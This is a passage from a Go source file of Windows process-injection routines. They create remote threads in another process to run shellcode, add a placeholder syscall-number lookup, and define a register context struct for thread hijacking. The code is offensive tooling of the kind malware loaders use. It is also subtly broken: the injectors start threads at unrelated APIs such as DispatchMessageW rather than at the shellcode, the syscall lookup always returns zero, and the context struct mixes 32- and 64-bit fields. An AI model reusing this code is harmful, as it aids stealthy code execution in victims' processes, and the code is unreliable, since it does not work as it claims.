    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

func injectUserCallbackTwoParam(procHandle uintptr, shellcodeAddr uintptr) error {
    win32u := syscall.NewLazyDLL("win32u.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    ntUserCallTwoParam := win32u.NewProc("NtUserCallTwoParam")
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        ntUserCallTwoParam.Addr(),
        shellcodeAddr,
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

func injectUser32Dispatch(procHandle uintptr, shellcodeAddr uintptr) error {
    user32 := syscall.NewLazyDLL("user32.dll")
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    
    // Use DispatchMessage or other user32 dispatch functions
    dispatchMessage := user32.NewProc("DispatchMessageW")
    createRemoteThread := kernel32.NewProc("CreateRemoteThread")
    
    threadHandle, _, err := createRemoteThread.Call(
        procHandle,
        0,
        0,
        dispatchMessage.Addr(),
        shellcodeAddr,
        0,
        0,
    )
    
    if threadHandle == 0 {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(syscall.Handle(threadHandle))
    
    return nil
}

// Utility to get syscall numbers dynamically (by parsing ntdll)
func getSyscallNumber(funcName string) (uintptr, error) {
    ntdll, err := syscall.LoadDLL("ntdll.dll")
    if err != nil {
        return 0, err
    }
    defer ntdll.Release()
    
    proc, err := ntdll.FindProc(funcName)
    if err != nil {
        return 0, err
    }
    
    // Read the syscall number from the function prologue
    // This is architecture-specific and requires parsing
    // For now, return a default value
    return 0, nil
}

// Context structure for thread hijacking
type Context struct {
    ContextFlags uint32
    Dr0          uintptr
    Dr1          uintptr
    Dr2          uintptr
    Dr3          uintptr
    Dr6          uintptr
    Dr7          uintptr
    FloatSave    [32]byte
    SegGs        uint32
    SegFs        uint32
    SegEs        uint32
    SegDs        uint32
    Edi          uint32
    Esi          uint32
    Ebx          uint32
    Edx          uint32
    Ecx          uint32
    Eax          uint32
    Ebp          uint32
    Eip          uint32
    SegCs        uint32
    EFlags       uint32
    Esp          uint32
    SegSs        uint32
    // AMD64 specific
    Rax          uintptr
    Rcx          uintptr
    Rdx          uintptr
    Rbx          uintptr
    Rsp          uintptr
    Rbp          uintptr
    Rsi          uintptr
    Rdi          uintptr
    R8           uintptr
    R9           uintptr
    R10          uintptr
    R11          uintptr
    R12          uintptr
    R13          uintptr
    R14          uintptr
    R15          uintptr
    Rip          uintptr
}

const (
    CONTEXT_FULL = 0x10007
)
